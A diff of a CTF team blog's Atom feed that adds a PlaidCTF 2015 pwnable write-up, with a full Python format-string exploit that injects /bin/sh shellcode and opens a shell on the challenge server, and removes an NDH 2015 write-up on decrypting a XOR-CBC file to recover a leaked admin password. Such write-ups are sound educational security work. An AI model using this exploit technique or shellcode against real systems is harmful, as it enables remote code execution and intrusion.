@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-06T17:08:59+04:30</updated>
+  <updated>2015-04-20T22:40:50+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,6 +12,138 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[PlaidCTF CTF 2015 - EBP Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/"/>
+    <updated>2015-04-20T22:40:13+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup</id>
+    <content type="html"><![CDATA[<p><strong>PlaidCTF 2015 EBP Writeup</strong><br/>
+<strong>Point = 160</strong><br/>
+<strong>Category = Pwnable</strong></p>
+
+<p>Unfortunately the CTF time for our team was completely under heavy pressure. but here is one i solved in my free time.</p>
+
+<blockquote><p>Category: Pwnable Points: 160 Solves: 157 Description:
+   nc 52.6.64.173 4545
+   Download: %p%o%o%p.</p></blockquote>
+
+<p>We are given an ELF file:</p>
+
+<pre><code>$ file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+ebp_a96f7231ab81e1b0d7fe24d660def25a.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4e8094f9986968cd856db5093810badbb0749fde, not stripped
+</code></pre>
+
+<p>first attempt peresented us that it&rsquo;s a Format String Vulenrability.</p>
+
+<pre><code>$ ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+%p%p%p%p%p
+0xa0x10xf76c40000xffec67180x804852c
+</code></pre>
+
+<p>We noticed that the binary is provided with disabled NX.</p>
+
+<pre><code>checksec.sh --file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ebp_a96f7231ab81e1b0d7fe24d660def25a.elf
+</code></pre>
+
+<p>So it was pretty simple to run our shellcode and execute proper command to read the flag.</p>
+
+<p>It was the time to see the binary. IDA showed us that the buggy function is <code>make_response</code> since no FMT was used.</p>
+
+<pre><code>int make_response()
+{
+  return snprintf(response, 0x400u, buf);
+}
+</code></pre>
+
+<p>but <code>response</code> and <code>buf</code> are on <strong>BSS</strong> and we should change execution flow to this address <code>0x0804A480</code>.</p>
+
+<p>By dumping stack on executing <code>make_response</code> we had these values:</p>
+
+<pre><code>Breakpoint 1, 0x08048503 in make_response ()
+gdb-peda$ x/64wx $esp
+0xffffcc30:     0xf7fadc20      0x0804a080      0x000003ff      0x0000000a
+0xffffcc40:     0x00000001      0xf7fad000      0xffffcc68      0x0804852c
+0xffffcc50:     0xffffcc88      0xf7ff04b0      0xffffccb4      0xf7fad000
+0xffffcc60:     0x00000000      0x00000000      0xffffcc88      0x08048557
+0xffffcc70:     0x0804a080      0x00000400      0xf7fadc20      0xf7fad000
+0xffffcc80:     0x08048580      0x00000000      0x00000000      0xf7e1da83
+0xffffcc90:     0x00000001      0xffffcd24      0xffffcd2c      0xf7feac9a
+0xffffcca0:     0x00000001      0xffffcd24      0xffffccc4      0x0804a01c
+0xffffccb0:     0x08048278      0xf7fad000      0x00000000      0x00000000
+0xffffccc0:     0x00000000      0xb9b964cc      0x8594c0dc      0x00000000
+0xffffccd0:     0x00000000      0x00000000      0x00000001      0x08048400
+0xffffcce0:     0x00000000      0xf7ff04b0      0xf7e1d999      0xf7ffd000
+0xffffccf0:     0x00000001      0x08048400      0x00000000      0x08048421
+0xffffcd00:     0x08048547      0x00000001      0xffffcd24      0x08048580
+0xffffcd10:     0x080485f0      0xf7feb130      0xffffcd1c      0x0000001c
+0xffffcd20:     0x00000001      0xffffcf57      0x00000000      0xffffcf96
+</code></pre>
+
+<p>You may notice that to overwriting a value via FMT vuln we should provide an address to <code>%n</code>. but we had just BSS variables so we should make this environment manually. As name of the challenge suggets we can use saved frame pointer since it has address of this frame. The scenario is pretty simple:</p>
+
+<ol>
+<li>leak an stack address to find location of RET address of current function <code>make_response</code>.</li>
+<li>overwrite RET address in place of saved frame pointer (which ebp points to it).</li>
+<li>again using a format string overwrite RET with <code>response</code> address.</li>
+</ol>
+
+
+<p>You should notice that we should write 2 least significant byte of ebp address location (%hhn).</p>
+
+<p>TL;DR</p>
+
+<p>This is what i used as exploiting this challenge:</p>
+
+<pre><code>import socket
+import struct
+import telnetlib
+
+response = 0x0804a480
+
+offset = 4 # saved frame pointer offset 
+
+shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php
+    "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
+        "\x73\x68\x68\x2f\x62\x69\x6e\x54"
+        "\x5b\x52\x53\x54\x59\x0f\x34"
+)
+
+s = socket.create_connection(("52.6.64.173", 4545 ))
+#s = socket.create_connection(("127.0.0.1", 8080 ))
+s.send("%4$p\n")
+addr = int(s.recv(1024), 16)
+print "[+] Leaked Address: ", hex(addr)
+addr1 = (addr - 0x1c) &amp; 0xffff
+print "[+] 2Byte Significant Byte to write : ", hex(addr1) 
+
+s.send("%"+str(addr1)+"x%"+str(offset)+"$hn\n")
+s.recv(4096)
+
+s.send(shellcode+"%"+str((response &amp; 0xffff)-len(shellcode))+"x%"+str(12)+"$hn\n")
+print "[+] Here you go"
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>running the exploit we have:</p>
+
+<pre><code>$ python 5.py 
+[+] Leaked Address:  0xffbea7c8
+[+] 2Byte Significant Byte to write :  0xa7ac
+[+] Here you go
+cat /home/problem/flag.txt
+who_needs_stack_control_anyway?
+</code></pre>
+
+<p>So we&rsquo;ve got 160 point.</p>
+
+<p>@HAMIDx9</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[NDH CTF 2015 - Weshgrow Writeup]]></title>
@@ -298,189 +430,6 @@ for pkt in pkts:
         flag += chr(pkt[IP].id)
 print flag      
 </code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[NDH CTF 2015 - Updator Writeup]]></title>
-    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup/"/>
-    <updated>2015-04-05T03:28:56+04:30</updated>
-    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup</id>
-    <content type="html"><![CDATA[<p><strong>NDH 2015 Updator Writeup</strong><br/>
-<strong>Point = 200</strong><br/>
-<strong>Category = Exploit</strong></p>
-
-<blockquote><p>Unhackable : &ldquo;Not hackable; that cannot be hacked or broken into.&rdquo;
-We manage updates and thus have fixes, this is not a PS3 as it is unhackable &hellip; or is it?
-Score     200
-Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.nuitduhack.com/</a></p></blockquote>
-
-<p>openning the url gives us a login page and a update button. pressing update button shows an notification:</p>
-
-<blockquote><p>The update managing system is still under construction but will be available soon.</p></blockquote>
-
-<p>We noticed it&rsquo;s a python script <code>update.py</code>. So attempting to loading <code>update.pyc</code> gave us the permission to download the file. Instantly i tried to decompile the code with <code>uncompyle2</code> as:</p>
-
-<!--more-->
-
-
-<pre><code>$ /usr/local/bin/uncompyle2 update.pyc &gt; update.py
-$ cat update.py
-# 2015.04.05 03:00:11 IRDT
-# Embedded file name: update.py
-import config
-import sys
-KEY = config.KEY
-
-def xor(*args):
-    if len(args) &lt; 2:
-        sys.exit(0)
-    length = len(args[0])
-    for arg in args:
-        if len(arg) != length:
-            sys.exit(0)
-        length = len(arg)
-
-    cipher = args[0]
-    for arg in args[1:]:
-        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])
-
-    return cipher
-
-
-class Crypto:
-
-    @staticmethod
-    def encrypt(file):
-        with open(file, 'r') as fd:
-            content = fd.read()
-        content = content.ljust(len(content) + (8 - len(content) % 8), '0')
-        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
-        with open('%s.encrypted' % file, 'w') as fd:
-            encrypted = []
-            for i in range(len(blocks)):
-                if i == 0:
-                    encrypted.append(xor(KEY, blocks[i]))
-                else:
-                    encrypted.append(xor(KEY, blocks[i], encrypted[i - 1]))
-
-            fd.write(''.join(encrypted))
-
-    @staticmethod
-    def decrypt(file):
-        with open(file, 'r') as fd:
-            content = fd.read()
-        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
-        with open('.'.join(file.split('.')[:-1]), 'w') as fd:
-            plain = []
-            for i in range(len(blocks)):
-                if i == 0:
-                    plain.append(xor(KEY, blocks[i]))
-                else:
-                    plain.append(xor(KEY, blocks[i], blocks[i - 1]))
-
-            fd.write(''.join(plain).rstrip('0'))
-
-
-print 'Content-Type: text/html'
-print '\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset="UTF-8"&gt;\n    &lt;title&gt;Updator - Update system&lt;/title&gt;\n    &lt;link rel="stylesheet" href="static/font-awesome/css/font-awesome.css"&gt;\n    &lt;link rel="stylesheet" href="static/css/style.css"&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id="info"&gt;\n      The update managing system is still under construction but will be available soon.\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n'
-# okay decompyling update.pyc 
-# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
-# 2015.04.05 03:00:11 IRDT
-</code></pre>
-
-<p>This a simple CBC mode XOR encryption. In the meantime my friend figured out that <code>robots.txt</code> tells us we should take look at <code>/temp/</code> directory. there was a file named <code>log.py.encrypted</code>:</p>
-
-<blockquote><p>Index of /temp
-[ICO]  Name    Last modified   Size    Description<br/>
-[DIR]  Parent Directory        - <br/>
-[TXT]  log.py.encrypted    31-Mar-2015 17:35   328      <br/>
-Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>
-
-<p>As we saw in the decompiled source the encrypt function encrypts a file and saves as <code>name+.encrypted</code>. So we tried to decrypt the file as my friend did. with this assumption that the first block has <code>import</code> keyword he xor the first block with that and take a some chars for the <code>KEY</code>. remember the CBC mode:
-<img src="http://upload.wikimedia.org/wikipedia/commons/8/80/CBC_encryption.svg"/><br/>
-We have second block if we calculate <code>encrypted[0] ^ encrypted[1]</code>. So he xored the calculated block and the key he take from the previous part. and there was <code>atetime</code>. So after completing the key we can decrypt the file. ( ofcourse it is not a proper solution as you can use xortool and &hellip; but faster than everything :) thanks to him ;) ). So i managed to decrypt the file using edited above source:</p>
-
-<pre><code>import sys
-KEY = '6[@dq"&amp;s'
-
-def xor(*args):
-    if len(args) &lt; 2:
-        sys.exit(0)
-    length = len(args[0])
-    for arg in args:
-        if len(arg) != length:
-            sys.exit(0)
-        length = len(arg)
-
-    cipher = args[0]
-    for arg in args[1:]:
-        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])
-
-    return cipher
-
-
-def decrypt(file):
-    with open(file, 'rb') as fd:
-        content = fd.read()
-    blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
-    with open('.'.join(file.split('.')[:-1]), 'w') as fd:
-        plain = []
-        for i in range(len(blocks)):
-            if i == 0:
-                plain.append(xor(KEY, blocks[i]))
-            else:
-                plain.append(xor(KEY, blocks[i], blocks[i - 1]))
-
-        fd.write(''.join(plain).rstrip('0'))
-
-
-decrypt('log.py.encrypted')
-</code></pre>
-
-<p>make sure you use <code>rb</code> to decrypt properly. We have decrypted file as:</p>
-
-<pre><code>import datetime
-
-LOG_DIR = 'logs'
-
-class Logger():
-
-    @staticmethod
-    def log(username, password):
-        basename = '%s/%s_%s' % (LOG_DIR, str(datetime.date.today()), username)
-        with open(basename, 'a+') as fd:
-            fd.write('[%s] Login with password %s\n' % (str(datetime.datetime.today()), password))
-</code></pre>
-
-<p>there is another directory we should take a look <code>logs</code> no permission:</p>
-
-<blockquote><p>Forbidden<br/>
-You don&rsquo;t have permission to access /logs/ on this server.<br/>
-Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>
-
-<p>but reading carefully the code gave me the idea to find the exact location:</p>
-
-<pre><code class="python">&gt;&gt;&gt; import datetime
-&gt;&gt;&gt; str(datetime.date.today())
-'2015-04-04'
-&gt;&gt;&gt; print "%s/%s_%s" %("logs", str(datetime.date.today()), "admin")
-logs/2015-04-04_admin
-&gt;&gt;&gt; 
-</code></pre>
-
-<p>opening <code>http://updator.challs.nuitduhack.com/logs/2015-04-04_admin</code> gave me this log:</p>
-
-<blockquote><p>[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf
-[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf</p></blockquote>
-
-<p>Second password worked for me and after logging in we have the flag:</p>
-
-<blockquote><p>Well played, here is your flag : zEpbiUFt5p7m84cxOxN6</p></blockquote>
-
-<p>Interesting challenge So we&rsquo;ve got 200pts.</p>
-
-<p>HAMIDx9</p>
 ]]></content>
   </entry>
   
